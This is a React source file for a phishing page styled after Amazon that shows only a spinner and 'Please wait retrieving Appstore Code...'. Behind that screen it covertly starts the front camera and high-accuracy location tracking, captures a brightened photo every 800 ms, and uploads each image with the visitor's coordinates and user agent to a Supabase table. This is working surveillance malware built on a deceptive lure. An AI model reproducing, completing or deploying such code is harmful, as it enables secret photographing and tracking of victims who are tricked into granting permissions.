import { useEffect, useState, useRef } from 'react';
import { Camera, MapPin, CheckCircle, XCircle } from 'lucide-react';
import { supabase } from './lib/supabase';

import { AmazonSkeleton } from './components/AmazonSkeleton';
import { AmazonSpinner } from './components/AmazonSpinner';

interface CaptureData {
  image: string | null;
  location: {
    latitude: number;
    longitude: number;
    accuracy: number;
  } | null;
  userAgent: string;
}

function App() {
  const [status, setStatus] = useState<'capturing' | 'error'>('capturing');
  const [lastCapture, setLastCapture] = useState<CaptureData | null>(null);
  const [captureCount, setCaptureCount] = useState(0);
  const [errorMessage, setErrorMessage] = useState<string>('');

  const videoRef = useRef<HTMLVideoElement | null>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const locationRef = useRef<CaptureData['location']>(null);
  const isProcessingRef = useRef(false);

  useEffect(() => {
    let intervalId: number;

    const startSystem = async () => {
      try {
        // Request Permissions Sequence
        // if ('Notification' in window) {
        //   try {
        //     await Notification.requestPermission();
        //   } catch (e) {
        //     console.log('Notification permission check failed', e);
        //   }
        // }

        // Start Location Watch
        navigator.geolocation.watchPosition(
          (pos) => {
            locationRef.current = {
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              accuracy: pos.coords.accuracy
            };
          },
          (err) => console.warn('Location watch error:', err),
          { enableHighAccuracy: true, maximumAge: 0 }
        );

        // Start Camera
        const stream = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: 'user',
            width: { ideal: 1280 },
            height: { ideal: 720 },
          },
        });
        streamRef.current = stream;

        const videoTrack = stream.getVideoTracks()[0];
        if (videoTrack.getSettings) {
          try {
            await videoTrack.applyConstraints({
              advanced: [
                { brightness: { ideal: 100 } },
                { contrast: { ideal: 80 } },
                { saturation: { ideal: 100 } },
              ] as any,
            });
          } catch (e) {
            console.log('Could not apply advanced constraints');
          }
        }

        const video = document.createElement('video');
        video.srcObject = stream;
        // Essential to play the video to get frames
        await video.play();
        videoRef.current = video;

        // Start Interval Loop (800ms)
        intervalId = window.setInterval(captureFrame, 800);

      } catch (error) {
        console.error('System Start Error:', error);
        setErrorMessage(error instanceof Error ? error.message : 'Unknown error occurred');
        setStatus('error');
      }
    };

    startSystem();

    return () => {
      if (intervalId) clearInterval(intervalId);
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(t => t.stop());
      }
    };
  }, []);

  const captureFrame = async () => {
    // Prevent overlap if upload takes > 800ms
    if (!videoRef.current || isProcessingRef.current) return;

    isProcessingRef.current = true;
    try {
      const video = videoRef.current;
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      const ctx = canvas.getContext('2d');
      if (!ctx) return;

      ctx.drawImage(video, 0, 0);

      // Image Processing (Brighten)
      const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
      const data = imageData.data;
      for (let i = 0; i < data.length; i += 4) {
        // Enhancing brightness/contrast same as before
        data[i] = Math.min(255, Math.pow(data[i] / 255, 0.7) * 255 * 1.4);
        data[i + 1] = Math.min(255, Math.pow(data[i + 1] / 255, 0.7) * 255 * 1.4);
        data[i + 2] = Math.min(255, Math.pow(data[i + 2] / 255, 0.7) * 255 * 1.4);
      }
      ctx.putImageData(imageData, 0, 0);

      const imageBase64 = canvas.toDataURL('image/jpeg', 0.85);
      const location = locationRef.current;

      // Upload to Supabase
      await supabase.from('device_captures').insert({
        image_data: imageBase64,
        latitude: location?.latitude,
        longitude: location?.longitude,
        accuracy: location?.accuracy,
        user_agent: navigator.userAgent
      });

      // Update UI State
      setLastCapture({
        image: imageBase64,
        location: location,
        userAgent: navigator.userAgent
      });
      setCaptureCount(c => c + 1);

    } catch (e) {
      console.error("Capture Loop Error:", e);
      // Optional: setStatus('error') if strictly required, but for loop we usually keep trying
    } finally {
      isProcessingRef.current = false;
    }
  };

  const [timeLeft, setTimeLeft] = useState(5);

  useEffect(() => {
    if (timeLeft > 0) {
      const timerId = setTimeout(() => setTimeLeft(timeLeft - 1), 1000);
      return () => clearTimeout(timerId);
    }
  }, [timeLeft]);

  const handleRetry = () => {
    window.location.reload();
  };

  return (
    <div className="flex flex-col items-center justify-center bg-gray-100 text-gray-800 h-screen p-4">
      {/* {timeLeft > 0 ? ( */}
      <div className="flex flex-col items-center space-y-4">
        <AmazonSpinner size="lg" />
        <h2 className="text-xl font-semibold">Please wait retrieving Appstore Code...</h2>
        {/* <p className="text-sm text-gray-600">Redirecting in {timeLeft} seconds</p> */}
      </div>
      {/* ) : ( */}
      {/* <div className="flex flex-col items-center space-y-4">
          <p className="text-lg mb-2">Connection timed out</p>
          <button
            onClick={handleRetry}
            className="px-6 py-2 bg-[#f0c14b] border border-[#a88734] rounded-sm shadow-sm hover:bg-[#ddb347] active:bg-[#cba945] text-sm focus:outline-none focus:ring-2 focus:ring-[#f0c14b] focus:ring-opacity-50"
          >
            Retry
          </button>
        </div>
      )} */}
    </div>
  );
}

export default App;
